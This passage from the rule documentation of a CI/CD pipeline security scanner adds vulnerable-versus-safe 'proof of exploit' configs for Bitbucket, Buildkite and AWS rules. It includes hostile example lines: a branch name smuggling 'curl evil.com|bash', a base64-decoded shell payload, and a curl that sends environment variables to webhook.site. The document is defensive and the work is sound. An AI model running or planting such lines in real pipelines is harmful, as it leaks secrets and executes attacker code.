+# Vulnerable: ``atlassian/aws-s3-deploy:1`` resolves to
+# whatever the publisher's latest 1.x image is at job
+# start. A publisher takeover (compromised Atlassian
+# Marketplace account, leaked token) repoints the tag
+# silently; every consumer's pipeline executes the new
+# image on the next run.
+pipelines:
+  default:
+    - step:
+        script:
+          - pipe: atlassian/aws-s3-deploy:1
+            variables: { ... }
+
+# Safe: pin to an exact version (``X.Y.Z``). Renovate /
+# Dependabot's bitbucket-pipe ecosystem bumps these in
+# reviewable PRs.
+pipelines:
+  default:
+    - step:
+        script:
+          - pipe: atlassian/aws-s3-deploy:1.7.0
+            variables: { ... }
+```
+
 **Source:** [`BB-001`](../providers/bitbucket.md#bb-001) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-002 }
@@ -2009,6 +2716,35 @@ pipelines:
 
 **Recommendation.** Store credentials as Repository / Deployment Variables in Bitbucket's Pipelines settings with the 'Secured' flag, and reference them by name. Prefer short-lived OIDC tokens for cloud access.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: literal AWS access key in pipeline-level
+# ``variables:``. The ``bitbucket-pipelines.yml`` is
+# committed to git; the build log echoes the value on
+# any step that prints env vars.
+variables:
+  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+pipelines:
+  default:
+    - step:
+        script:
+          - aws s3 cp ./build s3://bucket/
+
+# Safe: store the credentials as Repository / Workspace
+# variables marked ``secured`` in Bitbucket Settings.
+# The pipeline file references the env names; the values
+# resolve at runtime and are masked in logs.
+pipelines:
+  default:
+    - step:
+        script:
+          # AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY are
+          # configured as Repository Variables (secured)
+          - aws s3 cp ./build s3://bucket/
+```
+
 **Source:** [`BB-003`](../providers/bitbucket.md#bb-003) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-004`: Deploy step missing `deployment:` environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-004 }
@@ -2067,6 +2803,32 @@ pipelines:
 
 - Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a credential-shaped literal anywhere in
+# the pipeline body (step env, inline script, after-
+# script body). Anyone with repo read sees it; build
+# logs echo it whenever the step prints its env.
+pipelines:
+  default:
+    - step:
+        script:
+          - curl -H "Authorization: Bearer ghp_abcdef1234567890abcdef1234567890abcdef12" \
+              https://api.github.com/repos/org/repo/issues
+
+# Safe: route the credential through a secured
+# Repository / Workspace Variable. The pipeline body
+# carries the env name, never the value.
+pipelines:
+  default:
+    - step:
+        script:
+          # GITHUB_TOKEN is a secured Workspace Variable
+          - curl -H "Authorization: Bearer $GITHUB_TOKEN" \
+              https://api.github.com/repos/org/repo/issues
+```
+
 **Source:** [`BB-008`](../providers/bitbucket.md#bb-008) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-009`: pipe: pinned by version rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-bb-009 }
@@ -2086,6 +2848,48 @@ pipelines:
 **How this is detected.** Bitbucket steps declare artifacts on the producer and downstream steps implicitly receive them. When an unprivileged step produces an artifact and a later `deployment:` step consumes it without verification, attacker-controlled output flows into the privileged stage.
 
 **Recommendation.** Add a verification step before the deploy step consumes the artifact: `sha256sum -c artifact.sha256` against a manifest the producer signed, or `cosign verify` over the artifact directly. Alternatively, restrict the artifact-producing step to non-PR pipelines via ``branches:`` or ``custom:`` triggers.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a deploy step consumes ``build`` artifacts
+# produced by a PR-triggered build step. A fork PR's
+# build step uploads anything as ``build``; the deploy
+# step (which runs with the production credential set)
+# executes the attacker's binary.
+pipelines:
+  pull-requests:
+    "**":
+      - step:
+          name: build
+          script: ["./build.sh"]
+          artifacts: ["dist/**"]
+      - step:
+          name: deploy   # consumes the PR build's artifact
+          deployment: staging
+          script: ["./deploy ./dist/release"]
+
+# Safe: don't hand off PR artifacts to a deploy step.
+# Deploy only on ``branches: { main: ... }`` triggers,
+# where the artifact's producer was the trusted-context
+# build of ``main`` itself.
+pipelines:
+  pull-requests:
+    "**":
+      - step:
+          name: build
+          script: ["./build.sh"]
+  branches:
+    main:
+      - step:
+          name: build
+          script: ["./build.sh"]
+          artifacts: ["dist/**"]
+      - step:
+          name: deploy
+          deployment: production
+          script: ["./deploy ./dist/release"]
+```
 
 **Source:** [`BB-010`](../providers/bitbucket.md#bb-010) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -2115,6 +2919,30 @@ pipelines:
 
 - Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` install one-liner. A MITM
+# (compromised corporate proxy) or a hijacked installer
+# endpoint ships malicious code into the step's shell
+# with the pipeline's full credential set in scope.
+pipelines:
+  default:
+    - step:
+        script:
+          - curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify a sha256 digest from a trusted
+# source, then execute.
+pipelines:
+  default:
+    - step:
+        script:
+          - curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+          - echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+          - bash /tmp/cli.sh
+```
+
 **Source:** [`BB-012`](../providers/bitbucket.md#bb-012) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-013`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-013 }
@@ -2127,6 +2955,33 @@ pipelines:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker run --privileged`` plus the host
+# Docker socket inside a Bitbucket step. The step is
+# already a container; granting it privileged access
+# and the runner's docker.sock collapses every isolation
+# boundary the pipeline had.
+pipelines:
+  default:
+    - step:
+        services: [docker]
+        script:
+          - docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock \
+              myapp:test ./integration.sh
+
+# Safe: drop ``--privileged`` and the socket mount. If
+# the build needs to build an image, use Kaniko /
+# BuildKit rootless instead.
+pipelines:
+  default:
+    - step:
+        services: [docker]
+        script:
+          - docker run myapp@sha256:abc123... ./integration.sh
+```
+
 **Source:** [`BB-013`](../providers/bitbucket.md#bb-013) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-014`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-014 }
@@ -2138,6 +2993,31 @@ pipelines:
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip uses a plaintext-HTTP index and
+# ``--trusted-host`` silences hash verification on the
+# named host. A network attacker swaps wheels in flight.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim
+        script:
+          - pip install --index-url http://internal-pypi.example.com/simple \
+              --trusted-host internal-pypi.example.com -r requirements.txt
+
+# Safe: HTTPS + ``--require-hashes``. Internal CA installed
+# in the image's trust store.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim@sha256:abc123...
+        script:
+          - pip install --index-url https://internal-pypi.example.com/simple \
+              --require-hashes -r requirements.txt
+```
 
 **Source:** [`BB-014`](../providers/bitbucket.md#bb-014) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -2171,6 +3051,32 @@ pipelines:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``BITBUCKET_REPO_ACCESS_TOKEN`` written to
+# a file or piped to ``tee`` for downstream steps. The
+# token is meant to live only for the step's duration;
+# persisting it into an artifact or a cache extends the
+# credential's lifetime well beyond its intended scope.
+pipelines:
+  default:
+    - step:
+        script:
+          - echo "TOKEN=$BITBUCKET_REPO_ACCESS_TOKEN" >> .env
+        artifacts: [.env]
+
+# Safe: use the token inline in the one command that
+# needs it. Bitbucket scopes the token to the step's
+# lifetime and revokes it on exit.
+pipelines:
+  default:
+    - step:
+        script:
+          - curl --header "Authorization: Bearer $BITBUCKET_REPO_ACCESS_TOKEN" \
+              "https://api.bitbucket.org/2.0/repositories/$BITBUCKET_REPO_FULL_NAME"
+```
+
 **Source:** [`BB-017`](../providers/bitbucket.md#bb-017) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-018`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-018 }
@@ -2194,6 +3100,34 @@ pipelines:
 **Known false positives.**
 
 - The detector matches any variable whose name contains ``TOKEN`` / ``SECRET`` / ``PASSWORD`` / ``KEY`` (case-insensitive). Names that are descriptive rather than secret (``CACHE_KEY``, ``SORT_KEY``, ``TOKEN_TYPE`` used as a label, ``API_KEY_NAME`` storing the *name* of the key rather than its value) trigger the regex even though they aren't credentials. The rule has no way to tell from the name alone, suppress per-step via ``--ignore-file`` when the referenced value is benign.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``after-script`` runs even when the main
+# script fails. Echoing a secret env var here lands the
+# value in the build log on every failed build — which
+# is exactly when the log gets the most attention.
+pipelines:
+  default:
+    - step:
+        script:
+          - ./deploy.sh   # uses $DEPLOY_KEY
+        after-script:
+          - echo "Deploy attempted with $DEPLOY_KEY"   # leaks on failure
+
+# Safe: after-script body references only step IDs /
+# build metadata, never the secret env vars themselves.
+# Failure diagnostics belong in the main script, where
+# Bitbucket masks secured-variable values in output.
+pipelines:
+  default:
+    - step:
+        script:
+          - ./deploy.sh
+        after-script:
+          - echo "Deploy step $BITBUCKET_BUILD_NUMBER complete."
+```
 
 **Source:** [`BB-019`](../providers/bitbucket.md#bb-019) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -2245,6 +3179,34 @@ pipelines:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` (or
+# ``git config http.sslverify false`` / ``NODE_TLS_
+# REJECT_UNAUTHORIZED=0``) disables certificate
+# verification for the duration. A network attacker MITMs
+# the registry and ships substituted tarballs.
+pipelines:
+  default:
+    - step:
+        image: node:20@sha256:abc123...
+        script:
+          - npm config set strict-ssl false
+          - npm install
+
+# Safe: install the missing CA into the image's trust
+# store; keep strict-ssl on.
+pipelines:
+  default:
+    - step:
+        image: node:20@sha256:abc123...
+        script:
+          - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+          - update-ca-certificates
+          - npm install
+```
+
 **Source:** [`BB-023`](../providers/bitbucket.md#bb-023) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-024 }
@@ -2270,6 +3232,32 @@ pipelines:
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to a third-party webhook, or runs a
+# known miner binary. A malicious PR (or a compromised
+# maintainer) lands the payload in the pipeline file;
+# every subsequent build executes it.
+pipelines:
+  default:
+    - step:
+        script:
+          - echo Z2g6Li4uIA== | base64 -d | sh
+          - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# No obfuscated execution, no exfil POSTs, no
+# base64 -d | sh pipelines. If a check fires it's a
+# compromise or a CTF fixture; treat as incident response.
+pipelines:
+  default:
+    - step:
+        script:
+          - make build
+```
+
 **Source:** [`BB-025`](../providers/bitbucket.md#bb-025) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-026 }
@@ -2283,6 +3271,30 @@ pipelines:
 **Known false positives.**
 
 - ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval`` on a variable that came from a
+# pipeline variable / deployment env gives that value
+# full shell-grammar reach. ``sh -c $RAW`` on an
+# unquoted variable is the same shape.
+pipelines:
+  default:
+    - step:
+        script:
+          - eval "$BUILD_CMD"
+          - sh -c $RAW_HOOK
+
+# Safe: invoke a script you own with the value as a
+# quoted argument; let the script validate against an
+# allow-list. Never eval values from outside the step.
+pipelines:
+  default:
+    - step:
+        script:
+          - ./scripts/dispatch.sh "$BUILD_CMD"
+```
 
 **Source:** [`BB-026`](../providers/bitbucket.md#bb-026) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -2304,6 +3316,37 @@ pipelines:
 
 **Recommendation.** Every step that sets ``oidc: true`` must also declare a ``deployment:`` (production / staging / test). Bitbucket deployments enforce manual approvals, restricted variables, and audit logs that an ungated step bypasses. Steps reached through ``pull-requests:`` should never request OIDC tokens, any forked PR can drive the role assumption.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an OIDC step (``oidc: true``) runs on every
+# trigger, including pull-request builds. The OIDC role's
+# trust policy accepts any token from the repo, so a
+# fork-PR build assumes prod and runs whatever the role
+# permits.
+pipelines:
+  default:
+    - step:
+        oidc: true
+        script:
+          - aws configure set role_arn arn:aws:iam::123:role/prod
+          - aws deploy ...
+
+# Safe: route the OIDC step through a deployment-gated
+# environment (Bitbucket Deployments) so reviewer
+# approval is required before the token is minted, and
+# restrict the trigger to the protected branch.
+pipelines:
+  branches:
+    main:
+      - step:
+          oidc: true
+          deployment: production   # reviewer-gated
+          script:
+            - aws configure set role_arn arn:aws:iam::123:role/prod
+            - aws deploy ...
+```
+
 **Source:** [`BB-028`](../providers/bitbucket.md#bb-028) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-029`: image: (step or service) not pinned by sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-029 }
@@ -2317,6 +3360,31 @@ pipelines:
 **Known false positives.**
 
 - Bitbucket-vendored helper images (``atlassian/`` namespace) are still treated as third-party, the registry can move the tag. Pin them too rather than suppressing the rule globally.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: python:3.12-slim`` is a mutable
+# tag. Docker Hub's image team rebuilds it on every
+# Python point release; a publisher takeover ships code
+# into every Bitbucket pipeline that uses the tag.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim
+        script:
+          - pytest
+
+# Safe: pin to the content-addressable digest. The pin
+# documents which version the digest corresponded to so
+# bumps stay reviewable.
+pipelines:
+  default:
+    - step:
+        image: python@sha256:abc123...  # python:3.12.1-slim
+        script:
+          - pytest
+```
 
 **Source:** [`BB-029`](../providers/bitbucket.md#bb-029) in the [Bitbucket provider](../providers/bitbucket.md).
 
@@ -2369,6 +3437,30 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Recommendation.** Pin every plugin reference to an exact tag (``docker-compose#v4.13.0``) or a 40-char commit SHA. Bare references (``docker-compose``), branch refs (``#main`` / ``#master``), and major-only floats (``#v4``) resolve to whatever is current at agent start time, which lets a compromised plugin release execute inside the pipeline.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker-compose#main`` resolves at agent
+# boot to whatever sits at the plugin repo's main branch.
+# A push to the plugin repo (legitimate maintainer commit,
+# leaked token, takeover) ships code into every Buildkite
+# job that uses the plugin.
+steps:
+  - label: ":docker: build"
+    plugins:
+      - docker-compose#main:
+          run: app
+
+# Safe: pin to a release tag (or a 40-char commit SHA).
+# Renovate / Dependabot's buildkite-plugin ecosystem bumps
+# these in reviewable PRs so the pin doesn't drift.
+steps:
+  - label: ":docker: build"
+    plugins:
+      - docker-compose#v4.13.0:
+          run: app
+```
+
 **Source:** [`BK-001`](../providers/buildkite.md#bk-001) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `BK-002`: Literal secret value in pipeline env block <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-002 }
@@ -2385,6 +3477,34 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 - Names that imply a secret but actually store a non-sensitive identifier flag here: ``CACHE_KEY: build-2024-Q4``, ``API_KEY_PATH: /var/run/secrets/api``, ``SECRET_NAME: my-vault-secret``. The rule has no way to tell from the name + literal alone whether the value is the credential or merely a reference to one. Also: deliberate test fixtures and documentation snippets that embed canonical example values (``AKIAIOSFODNN7EXAMPLE``) match the strong-pattern set; this is intentional, real-world copies of those example literals usually mean a docs paste was never substituted.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal lives in
+# ``pipeline.yml``. The file is committed to git, visible
+# to anyone with repo read access, and printed in build
+# logs whenever a step echoes its environment.
+env:
+  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+steps:
+  - command: aws s3 cp build/ s3://bucket/
+
+# Safe: fetch the credential from Secrets Manager at
+# step-runtime via the ``aws-ssm`` plugin. The pipeline
+# file references the secret by parameter name; the actual
+# value lives in AWS Secrets Manager and rotates there
+# without a pipeline change.
+steps:
+  - command: aws s3 cp build/ s3://bucket/
+    plugins:
+      - seek-oss/aws-sm#v2.3.0:
+          env:
+            AWS_ACCESS_KEY_ID: /ci/aws/access_key_id
+            AWS_SECRET_ACCESS_KEY: /ci/aws/secret_access_key
+```
+
 **Source:** [`BK-002`](../providers/buildkite.md#bk-002) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `BK-003`: Untrusted Buildkite variable interpolated in command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-003 }
@@ -2399,6 +3519,30 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 - The single-token double-quoted form (``"$BUILDKITE_BRANCH"``) is already excluded; multi-token shell snippets that *look* unquoted but are consumed safely by the downstream tool (e.g. a ``./script.sh $BUILDKITE_BRANCH`` where the script treats argv as data and never re-evaluates) still flag. The rule has no AST-level understanding of the called script, suppress per-step via ``--ignore-file`` once you've verified the script handles untrusted argv safely (or quote the use, which is the better fix).
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an MR whose branch is named
+# ``feat;curl evil.com|bash;#`` lands the metacharacters
+# into the shell verbatim. The injected ``curl`` runs in
+# the build's shell context with the step's full secret
+# set in scope.
+steps:
+  - command: |
+      echo "Building $BUILDKITE_BRANCH"
+      ./build.sh --branch $BUILDKITE_BRANCH
+
+# Safe: assign the untrusted value to a local shell
+# variable, quote it on every use, and pass it as an
+# argument to a script you own. The shell sees one
+# argument; injected metacharacters stay literal.
+steps:
+  - command: |
+      branch="$BUILDKITE_BRANCH"
+      echo "Building $branch"
+      ./build.sh --branch "$branch"
+```
+
 **Source:** [`BK-003`](../providers/buildkite.md#bk-003) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `BK-004`: Remote script piped into shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-004 }
@@ -2411,6 +3555,32 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` trusts both the network path
+# (any MITM substitutes the script) and the host (a
+# compromised installer endpoint silently serves attacker
+# code). The script runs in the build's shell context.
+steps:
+  - label: ":hammer: install tools"
+    command: |
+      curl -fsSL https://installer.example.com/cli.sh | bash
+      ./cli build
+
+# Safe: download to a file, verify a sha256 digest from a
+# trusted source, then execute. If the upstream content
+# changes the digest stops matching and the build fails
+# before the malicious code runs.
+steps:
+  - label: ":hammer: install tools"
+    command: |
+      curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+      echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+      bash /tmp/cli.sh
+      ./cli build
+```
+
 **Source:** [`BK-004`](../providers/buildkite.md#bk-004) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `BK-005`: Container started with --privileged or host-bind escalation <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-005 }
@@ -2422,6 +3592,37 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 **Recommendation.** Drop ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host``, and ``-v /var/run/docker.sock`` from container invocations. If the workload needs Docker-in-Docker, use a build-specific rootless option (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead of opening the host kernel and the agent's Docker socket to the build script.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``--privileged`` plus the host Docker socket
+# gives the build container full access to the agent's
+# kernel and the runtime that started it. A compromise
+# (poisoned base image, RCE in app code) escapes to the
+# agent and from there to every other build sharing the
+# agent.
+steps:
+  - command: ./integration-test.sh
+    plugins:
+      - docker#v5.10.0:
+          image: app@sha256:abc123...
+          privileged: true
+          volumes:
+            - /var/run/docker.sock:/var/run/docker.sock
+
+# Safe: drop ``privileged`` and the socket mount. If the
+# build genuinely needs to build images, use a rootless
+# sandbox (Kaniko, BuildKit rootless, buildah
+# ``--isolation=chroot``) that produces images without
+# host-runtime access.
+steps:
+  - command: ./integration-test.sh
+    plugins:
+      - docker#v5.10.0:
+          image: app@sha256:abc123...
+          privileged: false
+```
 
 **Source:** [`BK-005`](../providers/buildkite.md#bk-005) in the [Buildkite provider](../providers/buildkite.md).
 
@@ -2549,6 +3750,32 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 - Some teams use a static prefix plus a CI-controlled tail (``queue: build-$BUILDKITE_PIPELINE_SLUG``) to share an agent pool across pipelines. ``BUILDKITE_PIPELINE_SLUG`` is not pusher-controllable so it isn't on the tainted list, but if your team has its own conventions for trusted Buildkite vars, suppress on the specific step.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``queue: $BUILDKITE_BRANCH`` lets the pusher
+# decide which agent pool runs their step. A PR branch
+# named ``production`` routes its build to the production
+# queue, which typically has elevated permissions (deploy
+# tokens, prod-only secrets) the PR was never meant to
+# reach.
+steps:
+  - label: ":rocket: deploy"
+    command: ./deploy.sh
+    agents:
+      queue: $BUILDKITE_BRANCH
+
+# Safe: pin the queue to a static literal. Production
+# agents should ALSO enforce the queue tag server-side
+# (``buildkite-agent start --tags 'queue=production'``) so
+# the rule is one layer of a defense-in-depth posture.
+steps:
+  - label: ":rocket: deploy"
+    command: ./deploy.sh
+    agents:
+      queue: production
+```
+
 **Source:** [`BK-015`](../providers/buildkite.md#bk-015) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `CA-000`: CodeArtifact API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-ca-000 }
@@ -2579,6 +3806,37 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Recommendation.** Route public package consumption through a pull-through cache repository governed by an allow-list of package names, and point build-time repos at that cache rather than directly at ``public:npmjs``/``public:pypi``. Unscoped public upstreams expose builds to dependency-confusion and typosquatting attacks.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodeArtifact repository wired to a public
+# upstream (npm.org / pypi.org / maven-central) without
+# allow-listing. Internal package names harvested from
+# repo manifests can be claimed on the public upstream
+# with a higher version; CodeArtifact resolves them via
+# the public upstream and ships attacker code to every
+# consumer (Birsan dependency confusion).
+import boto3
+ca = boto3.client('codeartifact')
+ca.create_repository(
+    domain='myorg', repository='shared',
+    upstreams=[{'repositoryName': 'public-pypi-store'}],
+    externalConnections=['public:pypi']
+)
+
+# Safe: drop the public external connection. Mirror only
+# the packages your org actually needs into a curated
+# internal upstream so an arbitrary public publisher
+# can't poison resolution.
+ca.delete_repository_permissions_policy(
+    domain='myorg', repository='shared'
+)
+ca.disassociate_external_connection(
+    domain='myorg', repository='shared',
+    externalConnection='public:pypi'
+)
+```
+
 **Source:** [`CA-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CA-003`: CodeArtifact domain policy allows cross-account wildcard <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ca-003 }
@@ -2589,6 +3847,39 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Recommendation.** Remove Allow statements with ``Principal: '*'`` from every CodeArtifact domain permissions policy, or restrict them with an ``aws:PrincipalOrgID`` condition so only accounts in your org can consume packages from the domain.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: CodeArtifact domain policy with
+# ``Principal: '*'`` and no condition. Any AWS principal
+# in any account can pull artifacts from the domain;
+# private package names + versions are also discoverable.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": "*",
+    "Action": ["codeartifact:GetPackageVersion*"],
+    "Resource": "*"
+  }]
+}
+
+# Safe: scope ``Principal`` to your org's account IDs (or
+# use the ``aws:PrincipalOrgID`` condition with your
+# Organizations org ID). External access is denied by
+# default unless explicitly granted.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"AWS": "*"},
+    "Action": ["codeartifact:GetPackageVersion*"],
+    "Resource": "*",
+    "Condition": {"StringEquals": {"aws:PrincipalOrgID": "o-abc123def4"}}
+  }]
+}
+```
+
 **Source:** [`CA-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CA-004`: CodeArtifact repo policy grants ``codeartifact:*`` with ``Resource '*'`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ca-004 }
@@ -2598,6 +3889,35 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 **How this is detected.** ``codeartifact:*`` on ``Resource: '*'`` collapses the entire repository's authority into one grant: the holder can read, write, delete, dispose, and re-publish every package. Even for a service principal that nominally only consumes packages, the grant lets a compromise of that consumer rewrite every dependency the team relies on.
 
 **Recommendation.** Scope Allow statements to specific ``codeartifact:`` actions (e.g. ``codeartifact:ReadFromRepository``) and to specific package-group ARNs. Wildcard action + wildcard resource is the classic over-broad grant that lets a consumer also publish.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``codeartifact:*`` on ``Resource: *``. The
+# bound principal can DeleteRepository,
+# DisposePackageVersions, UpdatePackageVersionsStatus
+# (mark malicious versions as Published), and PutRepository
+# PermissionsPolicy on every repo in every domain.
+{
+  "Effect": "Allow",
+  "Action": "codeartifact:*",
+  "Resource": "*"
+}
+
+# Safe: enumerate the verbs the workload actually needs
+# and scope ``Resource`` to the specific repo / domain.
+{
+  "Effect": "Allow",
+  "Action": [
+    "codeartifact:GetPackageVersionAsset",
+    "codeartifact:ReadFromRepository"
+  ],
+  "Resource": [
+    "arn:aws:codeartifact:us-east-1:123456789012:repository/myorg/shared",
+    "arn:aws:codeartifact:us-east-1:123456789012:package/myorg/shared/*/*/*"
+  ]
+}
+```
 
 **Source:** [`CA-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -2669,6 +3989,42 @@ Quote-state aware in the same way BK-003 is. ``"$BUILDKITE_BRANCH"`` doesn't fir
 
 **Recommendation.** Disable privileged mode unless the project explicitly requires Docker-in-Docker builds. If required, ensure the buildspec is tightly controlled, peer-reviewed, and sourced from a trusted repository with branch protection.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``privilegedMode: true`` on a CodeBuild
+# project gives the build container privileged Docker
+# access on the build host. A poisoned buildspec or a
+# malicious dependency at build time gets root on the
+# host kernel; CodeBuild hosts are shared so this can
+# reach other tenants' caches.
+import boto3
+cb = boto3.client('codebuild')
+cb.create_project(
+    name='my-build',
+    environment={
